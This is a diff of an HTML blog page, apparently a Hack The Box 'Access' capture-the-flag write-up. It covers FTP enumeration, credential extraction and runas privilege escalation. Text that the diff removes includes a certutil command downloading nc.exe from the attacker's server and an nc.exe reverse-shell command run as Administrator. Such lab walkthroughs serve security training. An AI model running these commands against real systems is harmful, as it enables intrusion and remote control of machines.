@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - Access | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - Access | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - Access" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using runas in windows , Which is like sudo in linux and doas in openbsd (we used doas in Ypuffy). It’s a windows box and its ip is 10.10.10.98 , I added it to /etc/hosts as access.htb Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC access.htb Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first. HTTP Enumeration We get this page titled as “MegaCorp” and it only has this image : Sub directories enumeration with gobuster and common.txt (/usr/share/wordlists/dirb/common.txt in kali) only gave us 2 pages , /aspnet_client and /index.html /aspnet_client gave us 403 Forbidden : And /index.html is of course the main page we saw earlier : So now we know that http has nothing , Next thing to check is ftp FTP Enumeration Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories Backups and Engineer In Backups there is only one file called backup.mdb , we will type binary to set the transfer mode to binary , so we won’t get a corrupted file. Then get backup.mdb to download it : And in Engineer there’s a file called Access Control.zip : Extracting credentials from backup.mdb and getting User backup.mdb is a Microsoft Access Database , we can check using file : We need mdbtools to deal with this database , it can be installed with apt apt-get install mdbtools We will use mdb-tables to get the table names : There’s an interesting table named auth_user , We will use mdb-export to get the contents of that table : mdb-export backup.mdb auth_user And it gave us some credentials : admin : admin engineer : access4u@security backup_admin : admin By looking at the other zip file we will find a file called Access Control.pst and it’s a password protected file. We already have 2 passwords : admin and access4u@security. access4u@security is the right password. Access Control.pst is a Microsoft Outlook email folder : We can use a tool called readpst to be able to read the file : readpst Access\ Control.pst It will create another file called Access Control.mbox , Let’s cat that file : The very first thing we see is this email which has credentials for an account called security , password : 4CcessC0ntr0ller Let’s telnet into the box with those credentials : telnet access.htb And we owned user ! runas and Privilege Escalation As always we will start enumerating the filesystem , There are only 3 users on the box Administrator , Public and security. We are in as security and we can’t go into Administrator’s directory so let’s check Public. In the Desktop of Public there’s a lnk called ZKAccess3.5 Security System. Let’s type it and see what’s inside it : Of course not the best output , because it’s a lnk file not a txt file , but we can read some stuff , and we notice that there’s a runas command being excuted as administrator. runas allows us to run commands as another user and the option /savecred allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing net user administrator Password required is set to No , If this was set to Yes we wouldn’t be able to use runas as administrator without knowing the password , However that lnk file on Public’s desktop was a nice hint. Now we can run a simple HTTP server on our box with python and host nc.exe : python -m SimpleHTTPServer 80 80 is the port number and it can be anything You can get nc.exe from github here , I also remember that I included another link in SecNotes write-up Then we will download it on the box : certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe After that we will set up our nc listener nc -lvnp 1337 1337 is the port number and it can be anything. Finally we will use runas to get a reverse shell : runas /user:Administrator /savecred &quot;nc.exe -c cmd.exe 10.10.xx.xx 1337&quot; Let’s check our listener : We have a shell. And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Zipper Next Hack The Box write-up : Hack The Box - Ethereal" />
-<meta property="og:description" content="Quick Summary Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using runas in windows , Which is like sudo in linux and doas in openbsd (we used doas in Ypuffy). It’s a windows box and its ip is 10.10.10.98 , I added it to /etc/hosts as access.htb Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC access.htb Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first. HTTP Enumeration We get this page titled as “MegaCorp” and it only has this image : Sub directories enumeration with gobuster and common.txt (/usr/share/wordlists/dirb/common.txt in kali) only gave us 2 pages , /aspnet_client and /index.html /aspnet_client gave us 403 Forbidden : And /index.html is of course the main page we saw earlier : So now we know that http has nothing , Next thing to check is ftp FTP Enumeration Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories Backups and Engineer In Backups there is only one file called backup.mdb , we will type binary to set the transfer mode to binary , so we won’t get a corrupted file. Then get backup.mdb to download it : And in Engineer there’s a file called Access Control.zip : Extracting credentials from backup.mdb and getting User backup.mdb is a Microsoft Access Database , we can check using file : We need mdbtools to deal with this database , it can be installed with apt apt-get install mdbtools We will use mdb-tables to get the table names : There’s an interesting table named auth_user , We will use mdb-export to get the contents of that table : mdb-export backup.mdb auth_user And it gave us some credentials : admin : admin engineer : access4u@security backup_admin : admin By looking at the other zip file we will find a file called Access Control.pst and it’s a password protected file. We already have 2 passwords : admin and access4u@security. access4u@security is the right password. Access Control.pst is a Microsoft Outlook email folder : We can use a tool called readpst to be able to read the file : readpst Access\ Control.pst It will create another file called Access Control.mbox , Let’s cat that file : The very first thing we see is this email which has credentials for an account called security , password : 4CcessC0ntr0ller Let’s telnet into the box with those credentials : telnet access.htb And we owned user ! runas and Privilege Escalation As always we will start enumerating the filesystem , There are only 3 users on the box Administrator , Public and security. We are in as security and we can’t go into Administrator’s directory so let’s check Public. In the Desktop of Public there’s a lnk called ZKAccess3.5 Security System. Let’s type it and see what’s inside it : Of course not the best output , because it’s a lnk file not a txt file , but we can read some stuff , and we notice that there’s a runas command being excuted as administrator. runas allows us to run commands as another user and the option /savecred allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing net user administrator Password required is set to No , If this was set to Yes we wouldn’t be able to use runas as administrator without knowing the password , However that lnk file on Public’s desktop was a nice hint. Now we can run a simple HTTP server on our box with python and host nc.exe : python -m SimpleHTTPServer 80 80 is the port number and it can be anything You can get nc.exe from github here , I also remember that I included another link in SecNotes write-up Then we will download it on the box : certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe After that we will set up our nc listener nc -lvnp 1337 1337 is the port number and it can be anything. Finally we will use runas to get a reverse shell : runas /user:Administrator /savecred &quot;nc.exe -c cmd.exe 10.10.xx.xx 1337&quot; Let’s check our listener : We have a shell. And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Zipper Next Hack The Box write-up : Hack The Box - Ethereal" />
+<meta name="description" content="My write-up for Access from Hack The Box." />
+<meta property="og:description" content="My write-up for Access from Hack The Box." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/access/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/access/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/access/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-03-02T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using runas in windows , Which is like sudo in linux and doas in openbsd (we used doas in Ypuffy). It’s a windows box and its ip is 10.10.10.98 , I added it to /etc/hosts as access.htb Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC access.htb Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first. HTTP Enumeration We get this page titled as “MegaCorp” and it only has this image : Sub directories enumeration with gobuster and common.txt (/usr/share/wordlists/dirb/common.txt in kali) only gave us 2 pages , /aspnet_client and /index.html /aspnet_client gave us 403 Forbidden : And /index.html is of course the main page we saw earlier : So now we know that http has nothing , Next thing to check is ftp FTP Enumeration Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories Backups and Engineer In Backups there is only one file called backup.mdb , we will type binary to set the transfer mode to binary , so we won’t get a corrupted file. Then get backup.mdb to download it : And in Engineer there’s a file called Access Control.zip : Extracting credentials from backup.mdb and getting User backup.mdb is a Microsoft Access Database , we can check using file : We need mdbtools to deal with this database , it can be installed with apt apt-get install mdbtools We will use mdb-tables to get the table names : There’s an interesting table named auth_user , We will use mdb-export to get the contents of that table : mdb-export backup.mdb auth_user And it gave us some credentials : admin : admin engineer : access4u@security backup_admin : admin By looking at the other zip file we will find a file called Access Control.pst and it’s a password protected file. We already have 2 passwords : admin and access4u@security. access4u@security is the right password. Access Control.pst is a Microsoft Outlook email folder : We can use a tool called readpst to be able to read the file : readpst Access\\ Control.pst It will create another file called Access Control.mbox , Let’s cat that file : The very first thing we see is this email which has credentials for an account called security , password : 4CcessC0ntr0ller Let’s telnet into the box with those credentials : telnet access.htb And we owned user ! runas and Privilege Escalation As always we will start enumerating the filesystem , There are only 3 users on the box Administrator , Public and security. We are in as security and we can’t go into Administrator’s directory so let’s check Public. In the Desktop of Public there’s a lnk called ZKAccess3.5 Security System. Let’s type it and see what’s inside it : Of course not the best output , because it’s a lnk file not a txt file , but we can read some stuff , and we notice that there’s a runas command being excuted as administrator. runas allows us to run commands as another user and the option /savecred allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing net user administrator Password required is set to No , If this was set to Yes we wouldn’t be able to use runas as administrator without knowing the password , However that lnk file on Public’s desktop was a nice hint. Now we can run a simple HTTP server on our box with python and host nc.exe : python -m SimpleHTTPServer 80 80 is the port number and it can be anything You can get nc.exe from github here , I also remember that I included another link in SecNotes write-up Then we will download it on the box : certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe After that we will set up our nc listener nc -lvnp 1337 1337 is the port number and it can be anything. Finally we will use runas to get a reverse shell : runas /user:Administrator /savecred &quot;nc.exe -c cmd.exe 10.10.xx.xx 1337&quot; Let’s check our listener : We have a shell. And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Zipper Next Hack The Box write-up : Hack The Box - Ethereal","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/access/","image":"http://localhost:4000/hackthebox/access/0.png","headline":"Hack The Box - Access","dateModified":"2019-03-02T00:00:00+02:00","datePublished":"2019-03-02T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/access/"},"@context":"http://schema.org"}</script>
+{"description":"My write-up for Access from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/access/","image":"http://localhost:4000/hackthebox/access/0.png","headline":"Hack The Box - Access","dateModified":"2019-03-02T00:00:00+02:00","datePublished":"2019-03-02T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/access/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,184 +32,283 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Access</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/ftp/';">ftp</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-03-02T00:00:00+02:00" itemprop="datePublished">Mar 2, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Access</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/ftp/">ftp</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 02 Mar 2019</div>
+  
+  <div class="post-description">My write-up for Access from Hack The Box.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-today-access-retired-and-this-is-my-write-up-i-dont-have-too-much-to-say-about-this-box--it-was-a-nice-easy-windows-box-and-a-good-example-of-using-runas-in-windows--which-is-like-sudo-in-linux-and-doas-in-openbsd-we-used-doas-in-ypuffy-its-a-windows-box-and-its-ip-is-10101098--i-added-it-to-etchosts-as-accesshtb">Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using <code class="highlighter-rouge">runas</code> in windows , Which is like <code class="highlighter-rouge">sudo</code> in linux and <code class="highlighter-rouge">doas</code> in openbsd (we used <code class="highlighter-rouge">doas</code> in <a href="/hack-the-box/ypuffy">Ypuffy</a>). It’s a windows box and its ip is 10.10.10.98 , I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">access.htb</code></h4>
-<p><img src="/images/hackthebox/access/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using <code class="highlighter-rouge">runas</code> in windows , Which is like <code class="highlighter-rouge">sudo</code> in linux and <code class="highlighter-rouge">doas</code> in openbsd (we used <code class="highlighter-rouge">doas</code> in <a href="/hack-the-box/ypuffy">Ypuffy</a>). It’s a windows box and its ip is 10.10.10.98 , I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">access.htb</code>
+<img src="/images/hackthebox/access/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC access.htb</code>
-<img src="/images/hackthebox/access/1.png" alt="" /></p>
-<h4 id="nmap-tells-us-that-theres-ftp-running-on-port-21--telnet-on-port-23-and-http-on-port-80-it-also-tells-us-that-we-can-login-anonymously-to-ftp-lets-look-at-http-first">Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first.</h4>
-<p><br /></p>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC access.htb</code>
+<img src="/images/hackthebox/access/1.png" alt="" />
+<br /> Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first.
+<br /></p>
 <hr />
 
-<h3 id="http-enumeration">HTTP Enumeration</h3>
-<h4 id="we-get-this-page-titled-as-megacorp-and-it-only-has-this-image-">We get this page titled as “MegaCorp” and it only has this image :</h4>
-<p><img src="/images/hackthebox/access/2.png" alt="" /></p>
-<h4 id="sub-directories-enumeration-with-gobuster-and-commontxt-usrsharewordlistsdirbcommontxt-in-kali-only-gave-us-2-pages--aspnet_client-and-indexhtml">Sub directories enumeration with <code class="highlighter-rouge">gobuster</code> and <code class="highlighter-rouge">common.txt</code> (<code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> in kali) only gave us 2 pages , <code class="highlighter-rouge">/aspnet_client</code> and <code class="highlighter-rouge">/index.html</code></h4>
-<p><img src="/images/hackthebox/access/3.png" alt="" /></p>
-<h4 id="aspnet_client-gave-us-403-forbidden-"><code class="highlighter-rouge">/aspnet_client</code> gave us <code class="highlighter-rouge">403</code> Forbidden :</h4>
-<p><img src="/images/hackthebox/access/4.png" alt="" /></p>
-<h4 id="and-indexhtml-is-of-course-the-main-page-we-saw-earlier-">And <code class="highlighter-rouge">/index.html</code> is of course the main page we saw earlier :</h4>
-<p><img src="/images/hackthebox/access/5.png" alt="" /></p>
-<h4 id="so-now-we-know-that-http-has-nothing--next-thing-to-check-is-ftp">So now we know that http has nothing , Next thing to check is ftp</h4>
-<p><br /></p>
+<h2 id="http-enumeration">HTTP Enumeration</h2>
+<p><br /> We get this page titled as “MegaCorp” and it only has this image :
+<img src="/images/hackthebox/access/2.png" alt="" />
+<br /> Sub directories enumeration with <code class="highlighter-rouge">gobuster</code> and <code class="highlighter-rouge">common.txt</code> (<code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> in kali) only gave us 2 pages , <code class="highlighter-rouge">/aspnet_client</code> and <code class="highlighter-rouge">/index.html</code> 
+<img src="/images/hackthebox/access/3.png" alt="" />
+<br /> <code class="highlighter-rouge">/aspnet_client</code> gave us <code class="highlighter-rouge">403</code> Forbidden :
+<img src="/images/hackthebox/access/4.png" alt="" />
+<br /> And <code class="highlighter-rouge">/index.html</code> is of course the main page we saw earlier :
+<img src="/images/hackthebox/access/5.png" alt="" />
+<br /> So now we know that http has nothing , Next thing to check is ftp
+<br /></p>
 <hr />
 
-<h3 id="ftp-enumeration">FTP Enumeration</h3>
-<h4 id="nmap-told-us-earlier-that-anonymous-login-on-ftp-was-allowed--after-we-login-we-find-2-directories-backups-and-engineer">Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories <code class="highlighter-rouge">Backups</code> and <code class="highlighter-rouge">Engineer</code></h4>
-<p><img src="/images/hackthebox/access/6.png" alt="" /></p>
-<h4 id="in-backups-there-is-only-one-file-called-backupmdb--we-will-type-binary-to-set-the-transfer-mode-to-binary--so-we-wont-get-a-corrupted-file-then-get-backupmdb-to-download-it-">In <code class="highlighter-rouge">Backups</code> there is only one file called <code class="highlighter-rouge">backup.mdb</code> , we will type <code class="highlighter-rouge">binary</code> to set the transfer mode to binary , so we won’t get a corrupted file. Then <code class="highlighter-rouge">get backup.mdb</code> to download it :</h4>
-<p><img src="/images/hackthebox/access/7.png" alt="" /></p>
-<h4 id="and-in-engineer-theres-a-file-called-access-controlzip-">And in <code class="highlighter-rouge">Engineer</code> there’s a file called <code class="highlighter-rouge">Access Control.zip</code> :</h4>
-<p><img src="/images/hackthebox/access/8.png" alt="" /></p>
+<h2 id="ftp-enumeration">FTP Enumeration</h2>
+<p><br /> Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories <code class="highlighter-rouge">Backups</code> and <code class="highlighter-rouge">Engineer</code>
+<img src="/images/hackthebox/access/6.png" alt="" />
+<br /> In <code class="highlighter-rouge">Backups</code> there is only one file called <code class="highlighter-rouge">backup.mdb</code> , we will type <code class="highlighter-rouge">binary</code> to set the transfer mode to binary , so we won’t get a corrupted file. Then <code class="highlighter-rouge">get backup.mdb</code> to download it :
+<img src="/images/hackthebox/access/7.png" alt="" />
+<br /> And in <code class="highlighter-rouge">Engineer</code> there’s a file called <code class="highlighter-rouge">Access Control.zip</code> :
+<img src="/images/hackthebox/access/8.png" alt="" /></p>
 <hr />
 
-<h3 id="extracting-credentials-from-backupmdb-and-getting-user">Extracting credentials from backup.mdb and getting User</h3>
-<h4 id="backupmdb-is-a-microsoft-access-database--we-can-check-using-file-"><code class="highlighter-rouge">backup.mdb</code> is a Microsoft Access Database , we can check using <code class="highlighter-rouge">file</code> :</h4>
-<p><img src="/images/hackthebox/access/9.png" alt="" /></p>
-<h4 id="we-need-mdbtools-to-deal-with-this-database--it-can-be-installed-with-apt">We need mdbtools to deal with this database , it can be installed with <code class="highlighter-rouge">apt</code></h4>
-<p><code class="highlighter-rouge">apt-get install mdbtools</code></p>
-<h4 id="we-will-use-mdb-tables-to-get-the-table-names-">We will use <code class="highlighter-rouge">mdb-tables</code> to get the table names :</h4>
-<p><img src="/images/hackthebox/access/10.png" alt="" /></p>
-<h4 id="theres-an-interesting-table-named-auth_user--we-will-use-mdb-export-to-get-the-contents-of-that-table-">There’s an interesting table named <code class="highlighter-rouge">auth_user</code> , We will use <code class="highlighter-rouge">mdb-export</code> to get the contents of that table :</h4>
-<p><code class="highlighter-rouge">mdb-export backup.mdb auth_user</code>
-<img src="/images/hackthebox/access/11.png" alt="" /></p>
-<h4 id="and-it-gave-us-some-credentials-">And it gave us some credentials :</h4>
-<p><code class="highlighter-rouge">admin : admin</code>
+<h2 id="extracting-credentials-from-backupmdb-and-getting-user">Extracting credentials from backup.mdb and getting User</h2>
+<p><br /> <code class="highlighter-rouge">backup.mdb</code> is a Microsoft Access Database , we can check using <code class="highlighter-rouge">file</code> :
+<img src="/images/hackthebox/access/9.png" alt="" />
+<br /> We need mdbtools to deal with this database , it can be installed with <code class="highlighter-rouge">apt</code>
+<code class="highlighter-rouge">apt-get install mdbtools</code>
+<br /> We will use <code class="highlighter-rouge">mdb-tables</code> to get the table names : 
+<img src="/images/hackthebox/access/10.png" alt="" />
+<br /> There’s an interesting table named <code class="highlighter-rouge">auth_user</code> , We will use <code class="highlighter-rouge">mdb-export</code> to get the contents of that table :
+<code class="highlighter-rouge">mdb-export backup.mdb auth_user</code>
+<img src="/images/hackthebox/access/11.png" alt="" />
+<br /> And it gave us some credentials : 
+<code class="highlighter-rouge">admin : admin</code>
 <br />
 <br />
 <code class="highlighter-rouge">engineer : access4u@security</code>
 <br />
 <br />
-<code class="highlighter-rouge">backup_admin : admin</code></p>
-<h4 id="by-looking-at-the-other-zip-file-we-will-find-a-file-called-access-controlpst-and-its-a-password-protected-file">By looking at the other <code class="highlighter-rouge">zip</code> file we will find a file called <code class="highlighter-rouge">Access Control.pst</code> and it’s a password protected file.</h4>
-<p><img src="/images/hackthebox/access/12.png" alt="" /></p>
-<h4 id="we-already-have-2-passwords--admin-and-access4usecurity-access4usecurity-is-the-right-password">We already have 2 passwords : <code class="highlighter-rouge">admin</code> and <code class="highlighter-rouge">access4u@security</code>. <code class="highlighter-rouge">access4u@security</code> is the right password.</h4>
-<p><img src="/images/hackthebox/access/13.png" alt="" /></p>
-<h4 id="access-controlpst-is-a-microsoft-outlook-email-folder-"><code class="highlighter-rouge">Access Control.pst</code> is a Microsoft Outlook email folder :</h4>
-<p><img src="/images/hackthebox/access/14.png" alt="" /></p>
-<h4 id="we-can-use-a-tool-called-readpst-to-be-able-to-read-the-file-">We can use a tool called <code class="highlighter-rouge">readpst</code> to be able to read the file :</h4>
-<p><code class="highlighter-rouge">readpst Access\ Control.pst</code>
-<img src="/images/hackthebox/access/15.png" alt="" /></p>
-<h4 id="it-will-create-another-file-called-access-controlmbox--lets-cat-that-file-">It will create another file called <code class="highlighter-rouge">Access Control.mbox</code> , Let’s <code class="highlighter-rouge">cat</code> that file :</h4>
-<p><img src="/images/hackthebox/access/16.png" alt="" /></p>
-<h4 id="the-very-first-thing-we-see-is-this-email-which-has-credentials-for-an-account-called-security--password--4ccessc0ntr0ller">The very first thing we see is this email which has credentials for an account called <code class="highlighter-rouge">security</code> , password : <code class="highlighter-rouge">4CcessC0ntr0ller</code></h4>
-<h4 id="lets-telnet-into-the-box-with-those-credentials-">Let’s <code class="highlighter-rouge">telnet</code> into the box with those credentials :</h4>
-<p><code class="highlighter-rouge">telnet access.htb</code>
-<img src="/images/hackthebox/access/17.png" alt="" /></p>
-<h4 id="and-we-owned-user-">And we owned user !</h4>
-<p><br /></p>
+<code class="highlighter-rouge">backup_admin : admin</code>
+<br /> By looking at the other <code class="highlighter-rouge">zip</code> file we will find a file called <code class="highlighter-rouge">Access Control.pst</code> and it’s a password protected file.
+<img src="/images/hackthebox/access/12.png" alt="" />
+<br /> We already have 2 passwords : <code class="highlighter-rouge">admin</code> and <code class="highlighter-rouge">access4u@security</code>. <code class="highlighter-rouge">access4u@security</code> is the right password.
+<img src="/images/hackthebox/access/13.png" alt="" />
+<br /> <code class="highlighter-rouge">Access Control.pst</code> is a Microsoft Outlook email folder : 
+<img src="/images/hackthebox/access/14.png" alt="" />
+<br /> We can use a tool called <code class="highlighter-rouge">readpst</code> to be able to read the file :
+<code class="highlighter-rouge">readpst Access\ Control.pst</code>
+<img src="/images/hackthebox/access/15.png" alt="" />
+<br /> It will create another file called <code class="highlighter-rouge">Access Control.mbox</code> , Let’s <code class="highlighter-rouge">cat</code> that file :
+<img src="/images/hackthebox/access/16.png" alt="" />
+<br /> The very first thing we see is this email which has credentials for an account called <code class="highlighter-rouge">security</code> , password : <code class="highlighter-rouge">4CcessC0ntr0ller</code>
+<br /> Let’s <code class="highlighter-rouge">telnet</code> into the box with those credentials : 
+<code class="highlighter-rouge">telnet access.htb</code>
+<img src="/images/hackthebox/access/17.png" alt="" />
+<br /> And we owned user !
+<br /></p>
 <hr />
 
-<h3 id="runas-and-privilege-escalation">runas and Privilege Escalation</h3>
-<h4 id="as-always-we-will-start-enumerating-the-filesystem--there-are-only-3-users-on-the-box-administrator--public-and-security">As always we will start enumerating the filesystem , There are only 3 users on the box <code class="highlighter-rouge">Administrator</code> , <code class="highlighter-rouge">Public</code> and <code class="highlighter-rouge">security</code>.</h4>
-<p><img src="/images/hackthebox/access/18.png" alt="" /></p>
-<h4 id="we-are-in-as-security-and-we-cant-go-into-administrators-directory-so-lets-check-public">We are in as <code class="highlighter-rouge">security</code> and we can’t go into Administrator’s directory so let’s check Public.</h4>
-<h4 id="in-the-desktop-of-public-theres-a-lnk-called-zkaccess35-security-system">In the Desktop of <code class="highlighter-rouge">Public</code> there’s a <code class="highlighter-rouge">lnk</code> called <code class="highlighter-rouge">ZKAccess3.5 Security System</code>.</h4>
-<p><img src="/images/hackthebox/access/19.png" alt="" /></p>
-<h4 id="lets-type-it-and-see-whats-inside-it-">Let’s <code class="highlighter-rouge">type</code> it and see what’s inside it :</h4>
-<p><img src="/images/hackthebox/access/20.png" alt="" /></p>
-<h4 id="of-course-not-the-best-output--because-its-a-lnk-file-not-a-txt-file--but-we-can-read-some-stuff--and-we-notice-that-theres-a-runas-command-being-excuted-as-administrator-runas-allows-us-to-run-commands-as-another-user-and-the-option-savecred-allows-us-to-use-the-command-without-asking-for-password-looking-into-publics-desktop-is-not-necessary-to-know-that-we-can-check-by-executing-net-user-administrator">Of course not the best output , because it’s a <code class="highlighter-rouge">lnk</code> file not a <code class="highlighter-rouge">txt</code> file , but we can read some stuff , and we notice that there’s a <code class="highlighter-rouge">runas</code> command being excuted as administrator. <code class="highlighter-rouge">runas</code> allows us to run commands as another user and the option <code class="highlighter-rouge">/savecred</code> allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing <code class="highlighter-rouge">net user administrator</code></h4>
-<p><img src="/images/hackthebox/access/21.png" alt="" /></p>
